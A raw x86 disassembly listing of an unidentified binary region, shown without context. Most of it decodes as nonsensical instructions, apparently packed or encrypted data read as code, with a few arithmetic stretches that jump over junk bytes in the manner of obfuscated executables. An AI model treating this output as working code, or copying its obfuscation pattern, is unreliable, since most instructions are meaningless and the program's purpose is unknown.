  408ff7:	inc    ebx
  408ff8:	out    dx,al
  408ff9:	sub    al,0x26
  408ffb:	das    
  408ffc:	sub    ebx,DWORD PTR [edi+0x45b6d043]
  409002:	fstp   QWORD PTR [eiz*2-0x41f2d3e1]
  409009:	shl    BYTE PTR [edx],1
  40900b:	inc    esp
  40900c:	imul   edi,esp,0xa
  40900f:	adc    BYTE PTR [ebp+0xa0ec6ca],bh
  409015:	fwait
  409016:	clc    
  409017:	pop    edi
  409018:	mov    DWORD PTR [esi+0x62],esp
  40901b:	pop    esp
  40901c:	arpl   WORD PTR [ebp-0x2af36c63],cx
  409022:	outs   dx,DWORD PTR ds:[esi]
  409023:	mov    ebp,0x28b990d7
  409028:	dec    edx
  409029:	cmp    BYTE PTR [edi+0x6f95f962],0x7e
  409030:	cmp    DWORD PTR [ebp+0x7c],edx
  409033:	xlat   BYTE PTR ds:[ebx]
  409034:	mov    ch,0x48
  409036:	dec    ebx
  409037:	rol    DWORD PTR [ebp+0x18],cl
  40903a:	fbld   TBYTE PTR [ebx]
  40903c:	lods   al,BYTE PTR ds:[esi]
  40903d:	and    eax,0x89ef2736
  409042:	mov    dl,BYTE PTR [ecx]
  409044:	mov    ah,0x0
  409046:	aam    0x87
  409048:	mov    eax,ds:0xb4605467
  40904d:	in     eax,dx
  40904e:	cmp    al,0x33
  409050:	cmc    
  409051:	std    
  409052:	inc    eax
  409053:	dec    edx
  409054:	(bad)  
  409055:	sbb    ch,ch
  409057:	sbb    DWORD PTR [eax+ebx*2-0x78911afe],0xb862ec15
  409062:	push   edi
  409063:	js     0x40900c
  409065:	test   BYTE PTR [edi+esi*2-0x20ef6c16],dh
  40906c:	pop    eax
  40906d:	fs (bad) 
  40906f:	mov    edi,0x36af028c
  409074:	sbb    ch,BYTE PTR [ebx+0x464a2cd]
  40907a:	inc    ebx
  40907b:	mov    WORD PTR [ebx],ss
  40907d:	xlat   BYTE PTR ds:[ebx]
  40907e:	(bad)  
  40907f:	and    eax,0x705610a
  409084:	sub    BYTE PTR [ecx+0x4d],0xfe
  409088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409089:	pop    ecx
  40908a:	imul   ebp,DWORD PTR [eiz*4+0x5f2127d4],0xffffffe9
  409092:	sti    
  409093:	inc    ebp
  409094:	ficom  WORD PTR [eax]
  409096:	fimul  DWORD PTR [edx+eax*8-0x322a6537]
  40909d:	cmp    BYTE PTR [ebp+0x3],0xe8
  4090a1:	nop
  4090a2:	scas   al,BYTE PTR es:[edi]
  4090a3:	bound  edi,QWORD PTR [edi-0x61]
  4090a6:	lods   al,BYTE PTR ds:[esi]
  4090a7:	lahf   
  4090a8:	sub    al,0x24
  4090aa:	fs xchg ebx,eax
  4090ac:	xchg   edi,eax
  4090ad:	mov    eax,0xe6f03e3d
  4090b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090b4:	xor    ecx,esp
  4090b6:	bound  ecx,QWORD PTR [eax-0x1e]
  4090b9:	pop    ebp
  4090ba:	dec    ecx
  4090bb:	push   ebp
  4090bc:	pushf  
  4090bd:	adc    bh,dl
  4090bf:	adc    bh,BYTE PTR [ebp-0x4afac3da]
  4090c5:	mov    ds:0xc9dec611,al
  4090ca:	sbb    BYTE PTR [eax],dl
  4090cc:	inc    ebx
  4090cd:	stos   DWORD PTR es:[edi],eax
  4090ce:	xchg   esp,eax
  4090cf:	arpl   sp,cx
  4090d1:	cmp    esi,eax
  4090d3:	mov    DWORD PTR ds:0x42a801,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x24a4c6c4
  4090f5:	popa   
  4090f6:	inc    ecx
  4090f7:	sbb    cl,BYTE PTR [esi-0x58878711]
  4090fd:	jle    0x409177
  4090ff:	js     0x409116
  409101:	lea    ebp,[edi+0x22]
  409104:	sahf   
  409105:	fdivr  QWORD PTR [ecx-0x43d2cfb1]
  40910b:	dec    edx
  40910c:	bound  ecx,QWORD PTR [eax+0x3c]
  40910f:	and    al,0x1c
  409111:	(bad)
  409114:	mov    cx,0xf425
  409118:	pop    eax
  409119:	mov    cl,0x20
  40911b:	xor    ch,dl
  40911d:	and    bl,bh
  40911f:	cmp    DWORD PTR ds:0x70009eda,ebp
  409125:	xor    al,0xa5
  409127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409128:	xor    ah,BYTE PTR [ebx+edi*2]
  40912b:	ds aaa 
  40912d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40912e:	inc    esi
  40912f:	and    dh,BYTE PTR [bp+di-0x2e]
  409133:	add    edx,DWORD PTR [edx-0x241b96db]
  409139:	mov    ebp,edx
  40913b:	pop    ss
  40913c:	push   edi
  40913d:	adc    al,0xb3
  40913f:	jne    0x4090ec
  409141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409142:	push   esi
  409143:	push   ecx
  409144:	(bad)  [ebx]
  409146:	imul   ebx,DWORD PTR [ebp+0x9c6c7a5],0xc3be6c63
  409150:	mov    dl,dh
  409152:	mov    WORD PTR [edx],cs
  409154:	cdq    
  409155:	daa    
  409156:	push   0x38df90b4
  40915b:	mov    edi,0x4b6068ae
  409160:	hlt    
  409161:	mov    ds:0xbf8f7660,al
  409166:	dec    esi
  409167:	push   es
  409168:	mov    ch,0xc2
  40916a:	in     al,0x74
  40916c:	in     al,0x90
  40916e:	xor    eax,DWORD PTR cs:[esi]
  409171:	cdq    
  409172:	pop    ds
  409173:	retf   0x8380
  409176:	sahf   
  409177:	mov    cl,0x81
  409179:	add    cl,bh
  40917b:	test   DWORD PTR [esi-0x4d],edx
  40917e:	aad    0xc
  409180:	jo     0x40917a
  409182:	aam    0xe4
  409184:	(bad)  
  409185:	jno    0x409201
  409187:	retf   0x749
  40918a:	xor    BYTE PTR [edx-0x25ac7c65],bl
  409190:	mov    dl,0x28
  409192:	mov    ebx,0xaac67804
  409197:	jl     0x40915e
  409199:	ret    0xf4c5
  40919c:	(bad)  
  40919d:	icebp  
  40919e:	xor    DWORD PTR [eax],0xffffffc4
  4091a1:	or     ebx,DWORD PTR [edi]
  4091a3:	ins    BYTE PTR es:[edi],dx
  4091a4:	js     0x4091bc
  4091a6:	(bad)  
  4091a7:	repnz imul ebp,esi,0x4a
  4091ab:	pusha  
  4091ac:	ret    0xb8fd
  4091af:	xor    DWORD PTR ds:0x16d2d662,ebx
  4091b5:	je     0x40917f
  4091b7:	loopne 0x4091a8
  4091b9:	and    DWORD PTR [ebx-0x74],ecx
  4091bc:	push   edi
  4091bd:	lds    ebx,FWORD PTR [esi+edi*4+0x51]
  4091c1:	inc    edx
  4091c2:	cmp    ah,BYTE PTR [ebp+0x25bfca81]
  4091c8:	mov    DWORD PTR [edx],0x976273bd
  4091ce:	ins    DWORD PTR es:[edi],dx
  4091cf:	jecxz  0x4091eb
  4091d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091d2:	inc    ebp
  4091d3:	xchg   ebp,eax
  4091d4:	mov    esp,0x86b1e30a
  4091d9:	push   edx
  4091da:	gs cmp eax,0x74a91bb
  4091e0:	iret   
  4091e1:	clc    
  4091e2:	jmp    0x9e81:0x3dc1e5bb
  4091e9:	or     edi,esi
  4091eb:	xchg   ecx,esp
  4091ed:	fcmovu st,st(5)
  4091ef:	enter  0xe68a,0x5
  4091f3:	sub    al,0x82
  4091f5:	dec    edi
  4091f6:	lods   eax,DWORD PTR ds:[esi]
  4091f7:	mul    BYTE PTR [ebx]
  4091f9:	(bad)  
  4091fa:	sub    BYTE PTR [eax],ah
  4091fc:	pusha  
  4091fd:	push   0x3bd572bc
  409202:	push   ds
  409203:	lods   al,BYTE PTR ds:[esi]
  409204:	ja     0x4091ee
  409206:	clc    
  409207:	stc    
  409208:	cmp    eax,0x556ee2f4
  40920d:	jno    0x409254
  40920f:	xor    eax,DWORD PTR [eax-0x21]
  409212:	repz xor DWORD PTR [edi+edx*8],esp
  409216:	fwait
  409217:	aas    
  409218:	xchg   BYTE PTR [ebx],bh
  40921a:	(bad)
  40921d:	pushf  
  40921e:	mov    cl,0x20
  409220:	arpl   WORD PTR [ebx+ebp*4+0x1c],bx
  409224:	stc    
  409225:	retf   0xaeae
  409228:	or     eax,0x2adf722c
  40922d:	jno    0x4091cc
  40922f:	(bad)  
  409230:	push   edx
  409231:	mov    edx,0x8d2868a3
  409236:	push   ss
  409237:	sahf   
  409238:	nop
  409239:	sub    BYTE PTR [esp+ecx*4-0x20],ah
  40923d:	cmp    eax,0x768afac3
  409242:	ds iret 
  409244:	mov    DWORD PTR [ebx-0x1707e6e6],edx
  40924a:	pop    edx
  40924b:	or     edi,DWORD PTR [esi+0x5f03a24]
  409251:	es jno 0x4091f5
  409254:	dec    ebx
  409255:	int    0x70
  409257:	jg     0x4091f7
  409259:	ja     0x409218
  40925b:	addr16 jge 0x4092ce
  40925e:	leave  
  40925f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409260:	(bad)  
  409261:	outs   dx,BYTE PTR ds:[esi]
  409262:	inc    edx
  409263:	cmp    dh,BYTE PTR [edi+edi*2+0x67]
  409267:	rcr    BYTE PTR [esi+ecx*2],cl
  40926a:	dec    esi
  40926b:	pop    esi
  40926c:	cmp    DWORD PTR [ebx],0x61113392
  409272:	pop    edi
  409273:	mov    esi,edi
  409275:	popf   
  409276:	cs ret 
  409278:	mov    edi,0x436720a9
  40927d:	inc    eax
  40927e:	call   0xa368:0x4b1c1344
  409285:	pop    eax
  409286:	jo     0x409230
  409288:	cmp    edx,esp
  40928a:	sbb    esi,DWORD PTR [edx]
  40928c:	push   edx
  40928d:	cmc    
  40928e:	push   ds
  40928f:	retf   
  409290:	jmp    0x61099cb9
  409295:	and    al,0x34
  409297:	jnp    0x409238
  409299:	lods   al,BYTE PTR ds:[esi]
  40929a:	adc    ecx,edi
  40929c:	mov    ecx,DWORD PTR [esi+0x60]
  40929f:	sbb    BYTE PTR [edx+ebp*4-0xbf672],bl
  4092a6:	in     al,dx
  4092a7:	(bad)  
  4092a9:	int3   
  4092aa:	jecxz  0x4092d0
  4092ac:	sahf   
  4092ad:	pop    ss
  4092ae:	xor    edx,esp
  4092b0:	pop    ebp
  4092b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092b2:	mov    eax,0xac2a7a49
  4092b7:	dec    esi
  4092b8:	sbb    DWORD PTR [edx+edi*1+0x6e25a45b],0x43a518c0
  4092c3:	stc    
  4092c4:	addr16 psubd mm5,mm4
  4092c8:	hlt    
  4092c9:	and    BYTE PTR [ecx-0x270ba58b],al
  4092cf:	std    
  4092d0:	jb     0x4092f8
  4092d2:	or     DWORD PTR [edx-0x4e],0x60
  4092d6:	pop    ds
  4092d7:	xchg   ebx,eax
  4092d8:	sub    cl,BYTE PTR [esi-0x33]
  4092db:	sub    BYTE PTR [ecx],bl
  4092dd:	ja     0x40932f
  4092df:	in     al,dx
  4092e0:	fs cs cdq 
  4092e3:	dec    edi
  4092e4:	mov    ah,0x8f
  4092e6:	shl    DWORD PTR [esi+0x374eaf34],1
  4092ec:	ja     0x409337
  4092ee:	cld    
  4092ef:	sub    BYTE PTR [ebx],bl
  4092f1:	mov    eax,ds:0xea9ac692
  4092f6:	jno    0x409293
  4092f8:	push   ss
  4092f9:	xor    BYTE PTR [edx+0x21],bl
  4092fc:	hlt    
  4092fd:	mov    bl,0xc1
  4092ff:	outs   dx,DWORD PTR ds:[esi]
  409300:	stos   DWORD PTR es:[edi],eax
  409301:	xchg   ebp,eax
  409302:	pop    es
  409303:	xchg   BYTE PTR [eax-0x76260b2f],al
  409309:	push   esp
  40930a:	pop    ds
  40930b:	pop    eax
  40930c:	fcmovnbe st,st(0)
  40930e:	xchg   edx,eax
  40930f:	fld    TBYTE PTR [edi-0x578ef884]
  409315:	jnp    0x409349
  409317:	arpl   bx,bp
  409319:	rol    DWORD PTR [esi+esi*8],cl
  40931c:	and    edi,0x38
  40931f:	leave  
  409320:	mov    cl,0x3a
  409322:	repz jne 0x409306
  409325:	in     eax,0x65
  409327:	pop    edx
  409328:	in     al,dx
  409329:	dec    edx
  40932a:	push   edx
  40932b:	mov    ?,WORD PTR [eax+0x65]
  40932e:	ret    0xbcae
  409331:	scas   eax,DWORD PTR es:[edi]
  409332:	add    ebp,DWORD PTR [ecx-0x78c841b8]
  409338:	cmp    DWORD PTR [eax+0x59],ebx
  40933b:	inc    ebp
  40933c:	dec    esp
  40933d:	ret    0x207
  409340:	or     bh,BYTE PTR [eax+0x474384a8]
  409346:	push   ebp
  409347:	jb     0x40934d
  409349:	arpl   WORD PTR ds:0xdef067a1,ax
  40934f:	ja     0x409352
  409351:	inc    eax
  409352:	(bad)  
  409353:	and    al,0xfd
  409355:	ss inc eax
  409357:	test   ecx,eax
  409359:	lods   eax,DWORD PTR ds:[esi]
  40935a:	and    esi,DWORD PTR [edi-0x38e240d7]
  409360:	pop    edi
  409361:	(bad)  [eax]
  409363:	or     al,0xc4
  409365:	mov    ds,WORD PTR [ebp-0x204d7d29]
  40936b:	and    eax,0xb31a3e91
  409370:	mov    edi,0xda10506
  409375:	or     eax,0xef1d5dfc
  40937a:	cmp    al,0xcb
  40937c:	mov    ch,0x7a
  40937e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40937f:	sub    esp,DWORD PTR [ebx]
  409381:	(bad)  
  409382:	mov    ch,0xe3
  409384:	cmp    DWORD PTR [edx-0x6ace28e3],0xda49f9d5
  40938e:	xor    eax,DWORD PTR [esi+0x13]
  409391:	aaa    
  409392:	mov    ah,0x9e
  409394:	inc    eax
  409395:	push   esi
  409396:	ja     0x409379
  409398:	xchg   BYTE PTR [edx+ebx*4+0x4],al
  40939c:	and    dh,BYTE PTR [ecx]
  40939e:	out    0xbe,al
  4093a0:	mov    ds:0x5a09e10b,al
  4093a5:	popa   
  4093a6:	shl    DWORD PTR [eax+0x2f],1
  4093a9:	mov    eax,DWORD PTR [ebp-0x4]
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x4ae7ff3d
  4093fb:	test   BYTE PTR [esi*1-0x58878714],ch
  409402:	jle    0x40947c
  409404:	js     0x409438
  409406:	(bad)  
  409407:	mov    eax,0x71ebd025
  40940c:	add    eax,0x6fda8cae
  409411:	aaa    
  409412:	mov    dl,0xb4
  409414:	dec    ebx
  409415:	(bad)  [ebx]
  409417:	lods   al,BYTE PTR ds:[esi]
  409418:	pop    eax
  409419:	clc    
  40941a:	shr    BYTE PTR [eax],cl
  40941c:	mov    al,0xc8
  40941e:	push   ds
  40941f:	hlt    
  409420:	xor    al,0x92
  409422:	pop    edx
  409423:	add    DWORD PTR [edx],edx
  409425:	hlt    
  409426:	sub    DWORD PTR [edi-0x788d4b80],0xaee991ad
  409430:	jmp    0x326bd51e
  409435:	mov    dl,0x2a
  409437:	pop    esp
  409438:	or     eax,0xfa34ccad
  40943d:	xchg   edx,eax
  40943e:	mov    ecx,ds
  409440:	push   ss
  409441:	push   esp
  409442:	(bad)  
  409443:	ja     0x4093cd
  409445:	inc    ebp
  409446:	sbb    ebx,ebp
  409448:	add    al,0x80
  40944a:	ret    
  40944b:	xchg   ebx,eax
  40944c:	mov    WORD PTR [ecx],gs
  40944e:	sbb    BYTE PTR es:[ecx+eax*8+0x286a8b37],bl
  409456:	sub    al,0xb2
  409458:	xor    DWORD PTR [ebp+0x52],esi
  40945b:	push   0xffffffae
  40945d:	push   ebp
  40945e:	ror    DWORD PTR [edi-0x55],0x3f
  409462:	push   ss
  409463:	jno    0x409457
  409465:	push   edx
  409466:	push   ebx
  409467:	sub    eax,0xb2aa3097
  40946c:	adc    eax,0xfde9d001
  409471:	sti    
  409472:	mov    eax,fs
  409474:	enter  0xe528,0xa9
  409478:	add    dl,bl
  40947a:	jmp    0x2ad44765
  40947f:	jnp    0x409453
  409481:	add    eax,0xf82c02f1
  409486:	mov    ebp,0x4576006c
  40948b:	out    0xaa,eax
  40948d:	pop    esi
  40948e:	loope  0x40950f
  409490:	push   ds
  409491:	nop
  409492:	lods   al,BYTE PTR ds:[esi]
  409493:	ins    BYTE PTR es:[edi],dx
  409494:	jb     0x409423
  409496:	hlt    
  409497:	(bad)  
  409498:	mov    DWORD PTR [edi+ebp*4+0x5ad81451],edi
  40949f:	xchg   ebp,eax
  4094a0:	push   eax
  4094a1:	pop    ebx
  4094a2:	leave  
  4094a3:	ins    DWORD PTR es:[edi],dx
  4094a4:	stc    
  4094a5:	and    ah,bh
  4094a7:	dec    esp
  4094a8:	mov    esp,0x2538e383
  4094ad:	cli    
  4094ae:	inc    edi
  4094af:	jp     0x40946b
  4094b1:	hlt    
  4094b2:	jno    0x40947e
  4094b4:	and    ebx,DWORD PTR [ecx-0x7e]
  4094b7:	pop    es
  4094b8:	xchg   BYTE PTR [ebp-0x1a4a302],ah
  4094be:	mov    dl,0x81
  4094c0:	sub    DWORD PTR [eax-0x4],edx
  4094c3:	pushf  
  4094c4:	jmp    0x477fce1
  4094c9:	les    edx,FWORD PTR [ecx*2-0x18d0e892]
  4094d0:	xor    ebp,esp
  4094d2:	mov    edi,0x265a877c
  4094d7:	cdq    
  4094d8:	ds and esp,ebx
  4094db:	jcxz   0x40952d
  4094de:	xor    al,0x49
  4094e0:	outs   dx,BYTE PTR ds:[esi]
  4094e1:	je     0x40948b
  4094e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e4:	xchg   edi,eax
  4094e5:	mov    ds:0xdbb781ca,eax
  4094ea:	inc    edx
  4094eb:	fcmovnu st,st(6)
  4094ed:	ja     0x4094d7
  4094ef:	ret    0x889
  4094f2:	mov    al,0xa5
  4094f4:	int3   
  4094f5:	ins    DWORD PTR es:[edi],dx
  4094f6:	mov    ecx,0x9034236c
  4094fb:	xor    DWORD PTR [eax-0xb],0xffffffbf
  4094ff:	and    BYTE PTR [eax],al
  409501:	and    BYTE PTR [ecx],bl
  409503:	call   0x82968ca9
  409508:	dec    esi
  409509:	adc    esi,DWORD PTR [esi+0x5b]
  40950c:	out    dx,eax
  40950d:	mov    ds:0x198cda72,eax
  409512:	fcom   DWORD PTR [esi-0x230abcb0]
  409518:	add    eax,DWORD PTR [ebx+0x3c2cf392]
  40951e:	sub    DWORD PTR [eax],esi
  409520:	bound  ebp,QWORD PTR [esi+0x4bc15c33]
  409526:	out    0x56,eax
  409528:	mov    al,ds:0x3bc94650
  40952d:	xor    edx,ebx
  40952f:	call   0xe4e92d2b
  409534:	gs sahf 
  409536:	mov    eax,ds:0x74c96788
  40953b:	mov    DWORD PTR [edi],edi
  40953d:	or     al,0xcf
  40953f:	xchg   ebx,eax
  409540:	lea    eax,[ebp-0x3288d673]
  409546:	add    al,0xbe
  409548:	test   ch,ch
  40954a:	outs   dx,BYTE PTR ds:[esi]
  40954b:	cmp    al,0x6b
  40954d:	mov    ebp,DWORD PTR [esp+esi*2-0x18]
  409551:	test   eax,0x3e69eb72
  409556:	push   ds
  409557:	or     esp,ebx
  409559:	mov    ebx,0xaebb9d35
  40955e:	test   DWORD PTR [edi],0xf45f0a37
  409564:	daa    
  409565:	sbb    DWORD PTR [edi+0x53c665a6],ebp
  40956b:	adc    DWORD PTR [edx],esp
  40956d:	or     edx,ebx
  40956f:	inc    ebp
  409570:	adc    eax,0x76e4d0c2
  409575:	imul   eax,DWORD PTR [eax],0x1f
  409578:	add    eax,0xa3dfdd28
  40957d:	das    
  40957e:	in     al,0x70
  409580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409581:	int    0x5e
  409583:	mov    ds:0x1c234081,eax
  409588:	ds push ss
  40958a:	mov    bl,0xd
  40958c:	out    dx,al
  40958d:	add    DWORD PTR [edx+0x1],0x6046997e
  409594:	mov    ds:0x7418f32f,al
  409599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40959a:	mov    ds:0x92092466,eax
  40959f:	cmp    eax,0x24da2da4
  4095a4:	sub    eax,0x2bb1d60b
  4095a9:	ins    BYTE PTR es:[edi],dx
  4095aa:	rol    bl,1
  4095ac:	fs inc eax
  4095ae:	dec    ecx
  4095af:	push   0x20c9a865
  4095b4:	push   ebp
  4095b5:	xor    DWORD PTR ds:0xa05b21fb,0xffffffc9
  4095bc:	(bad)  
  4095be:	and    DWORD PTR [bp+si-0x5abf],0x73
  4095c4:	fcom   QWORD PTR [edx-0x763db3a0]
  4095ca:	lahf   
  4095cb:	cs and ebx,esi
  4095ce:	adc    bh,BYTE PTR [edx+0x59]
  4095d1:	inc    ebx
  4095d2:	inc    ebp
  4095d3:	inc    edx
  4095d4:	xchg   esp,eax
  4095d5:	vpcmpeqw xmm4,xmm7,XMMWORD PTR ds:0xddc0c498
  4095dd:	adc    BYTE PTR [eax],cl
  4095df:	jae    0x40958a
  4095e1:	inc    ebx
  4095e2:	mov    eax,ds:0xde9df64c
  4095e7:	sub    ecx,DWORD PTR [edi]
  4095e9:	das    
  4095ea:	cld    
  4095eb:	imul   esi,DWORD PTR [eax+0x78],0xb4a2404
  4095f2:	(bad)  
  4095f3:	inc    ebp
  4095f5:	in     al,0x2d
  4095f7:	xor    cl,cl
  4095f9:	lea    ebx,[edi+0x3b]
  4095fc:	fxtract 
  4095fe:	jmp    0xb9a2:0xe4999ef2
  409605:	add    DWORD PTR [edx],0xffffff95
  409608:	dec    ecx
  409609:	jecxz  0x40965a
  40960b:	leave  
  40960c:	pop    ecx
  40960d:	xchg   sp,ax
  40960f:	scas   eax,DWORD PTR es:[edi]
  409610:	fucomi st,st(4)
  409612:	js     0x40960d
  409614:	mov    bl,0x1
  409616:	out    dx,al
  409617:	sub    DWORD PTR [ecx-0x4a],ecx
  40961a:	xor    eax,0xd0cc7b5d
  40961f:	sar    DWORD PTR [ebp-0x2],cl
  409622:	xor    ecx,edi
  409624:	pop    ds
  409625:	xor    DWORD PTR [edx+0x25018231],ebx
  40962b:	inc    edi
  40962c:	pop    edi
  40962d:	mov    ah,0xb8
  40962f:	dec    esp
  409630:	test   al,0x90
  409632:	sub    BYTE PTR [eax+0x6ea844e2],ah
  409638:	lahf   
  409639:	push   esi
  40963a:	mov    eax,0x914323b6
  40963f:	in     eax,dx
  409640:	push   ds
  409641:	or     BYTE PTR [eax],0x41
  409644:	and    eax,0xf1ea5a16
  409649:	sahf   
  40964a:	test   ch,dl
  40964c:	mov    eax,0x68103fe1
  409651:	xchg   edx,eax
  409652:	in     eax,dx
  409653:	das    
  409654:	mov    eax,0xa7a63fa0
  409659:	push   ss
  40965a:	xchg   edx,eax
  40965b:	add    eax,0xad0ab66e
  409660:	movups xmm0,XMMWORD PTR [ebx]
  409663:	nop
  409664:	mov    eax,ds:0x95e6ae19
  409669:	(bad)  
  40966a:	sti    
  40966b:	push   eax
  40966c:	cwde   
  40966d:	sub    al,0x3a
  40966f:	lock mov BYTE PTR [ebp+0x45f25a1a],bh
  409676:	ret    0xf13b
  409679:	xchg   esi,eax
  40967a:	mov    ecx,0xd4139c81
  40967f:	bound  ebx,QWORD PTR [ebx]
  409681:	add    eax,0xbe5d5e2b
  409686:	test   al,0xdf
  409688:	ret    
  409689:	stos   BYTE PTR es:[edi],al
  40968a:	and    al,0xfa
  40968c:	fidivr DWORD PTR [edi]
  40968e:	push   edx
  40968f:	dec    edx
  409690:	jno    0x4096fa
  409692:	xchg   ebp,eax
  409693:	jle    0x4096ca
  409695:	and    esi,esp
  409697:	xchg   edx,eax
  409698:	repnz xor al,0x9b
  40969b:	ja     0x40968c
  40969d:	(bad)  
  40969f:	push   bp
  4096a1:	dec    ebx
  4096a2:	call   0xc7bb5cd0
  4096a7:	mov    edi,0x108bf8a8
  4096ac:	dec    ebp
  4096ad:	pop    ds
  4096ae:	mov    eax,DWORD PTR [ebp-0x4]
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0xb6
  4096e4:	jmp    0x7878:0xf25c1719
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x4096cf
  4096f0:	mov    bl,0x83
  4096f2:	addr16 data16 in al,0xb1
  4096f6:	inc    ebx
  4096f7:	inc    ebx
  4096f8:	adc    al,BYTE PTR [ebx-0x46237415]
  4096fe:	adc    ebp,esi
  409700:	or     BYTE PTR [edx+0x19683c6e],bh
  409706:	scas   eax,DWORD PTR es:[edi]
  409707:	fistp  DWORD PTR [ecx-0x21]
  40970a:	jne    0x4096db
  40970c:	inc    esp
  40970d:	(bad)  
  40970e:	(bad)  
  409710:	in     al,0x43
  409712:	xor    DWORD PTR [eax+0x34],eax
  409715:	fstp   QWORD PTR [eax+0x1b]
  409718:	jbe    0x409710
  40971a:	inc    ebx
  40971b:	pushf  
  40971c:	xchg   edx,eax
  40971d:	xlat   BYTE PTR ds:[ebx]
  40971e:	add    edx,DWORD PTR [edx+0x4b65a837]
  409724:	push   esp
  409725:	call   0x990ba662
  40972a:	push   ss
  40972b:	rcr    BYTE PTR [ecx-0x36],1
  40972e:	(bad)  
  40972f:	dec    ecx
  409730:	cmp    BYTE PTR [eax-0x5e],0x49
  409734:	and    cl,BYTE PTR ds:0x50640744
  40973a:	shl    dl,cl
  40973c:	and    eax,0xe6429ff7
  409741:	dec    esi
  409742:	inc    ebp
  409743:	inc    ebx
  409744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409745:	cmp    BYTE PTR [ecx+0x22],bl
  409748:	in     al,0x91
  40974a:	add    BYTE PTR es:[esi+0x30dfed0d],dh
  409751:	mov    bh,0x1e
  409753:	inc    ebx
  409754:	push   ds
  409755:	sub    BYTE PTR [ecx+edi*4-0x4edcfbbd],dl
  40975c:	les    edi,FWORD PTR [edi+edx*8+0x43]
  409760:	pop    edi
  409761:	xor    ecx,DWORD PTR [ebx+0x34]
  409764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409765:	data16 and BYTE PTR [ecx-0x4f],dl
  409769:	mov    bh,0x6c
  40976b:	xor    al,0xae
  40976d:	add    bl,BYTE PTR [ecx]
  40976f:	arpl   bp,bp
  409771:	imul   ebp,DWORD PTR [edi-0x34],0xd4480bf4
  409778:	sub    cl,BYTE PTR [ecx+0x151d461c]
  40977e:	pop    ebx
  40977f:	rcr    BYTE PTR [ebx-0x500ee55c],cl
  409785:	jp     0x4097a7
  409787:	outs   dx,BYTE PTR ds:[esi]
  409788:	add    ch,BYTE PTR [ecx-0x34827bf4]
  40978e:	and    eax,0xe0e92310
  409793:	(bad)  
  409794:	dec    ebp
  409795:	mov    DWORD PTR [eax-0x2c],ebp
  409798:	push   edi
  409799:	gs pop esp
  40979b:	sub    eax,edi
  40979d:	jle    0x4097b7
  40979f:	outs   dx,BYTE PTR ds:[esi]
  4097a0:	fistp  WORD PTR [eax-0x2daa54e]
  4097a6:	fimul  WORD PTR [edx+eiz*1+0x46]
  4097aa:	mov    edx,0xb801bd59
  4097af:	sub    DWORD PTR [bp+si],edi
  4097b2:	addr16 or al,0x5f
  4097b5:	add    esi,DWORD PTR [esi-0xf90f9b2]
  4097bb:	fimul  WORD PTR [edi]
  4097be:	dec    ebp
  4097bf:	rol    edx,cl
  4097c1:	xlat   BYTE PTR ds:[ebx]
  4097c2:	test   DWORD PTR [eax+esi*8+0x5d],esi
  4097c6:	imul   esi,edx,0x6e
  4097c9:	sub    BYTE PTR [ecx-0x4e9e130d],0x34
  4097d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d1:	pop    es
  4097d2:	jne    0x4097fa
  4097d4:	cmp    eax,0x100e5f2d
  4097d9:	cs mov esi,0x2a79e755
  4097df:	push   eax
  4097e0:	jne    0x40980c
  4097e2:	add    al,BYTE PTR [ecx+0x36f38634]
  4097e8:	pop    es
  4097e9:	mov    DWORD PTR [esp+ebx*4+0x2e4690a8],esi
  4097f0:	cmp    eax,0xfae30726
  4097f5:	mov    ah,0x66
